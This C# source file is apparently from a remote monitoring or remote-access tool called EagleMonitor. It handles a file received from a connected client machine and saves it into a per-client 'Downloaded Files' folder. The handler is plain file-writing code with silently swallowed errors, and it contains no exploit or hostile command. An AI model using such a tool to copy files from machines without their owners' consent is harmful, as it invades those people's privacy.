using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib.Packet;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class DownloadFilePacketHandler
    {
        public DownloadFilePacketHandler(DownloadFilePacket downloadFilePacket, ClientHandler clientHandler) : base()
        {
            new Thread(() =>
            {
                try
                {
                    if (clientHandler.fileManagerForm != null)
                    {
                        if (clientHandler.fileManagerForm.files != null)
                        {
                            if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Downloaded Files\\"))
                                System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files");
                            System.IO.File.WriteAllBytes(clientHandler.clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName), downloadFilePacket.file);
                            clientHandler.fileManagerForm.files[Miscellaneous.SplitPath(downloadFilePacket.fileName)].Close();
                            clientHandler.fileManagerForm.files.Remove(Miscellaneous.SplitPath(downloadFilePacket.fileName));
                        }
                    }
                    else
                    {
                        if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Downloaded Files\\"))
                            System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files");
                        System.IO.File.WriteAllBytes(clientHandler.clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName), downloadFilePacket.file);
                    }
                }
                catch { }
            }).Start();
        }
    }
}
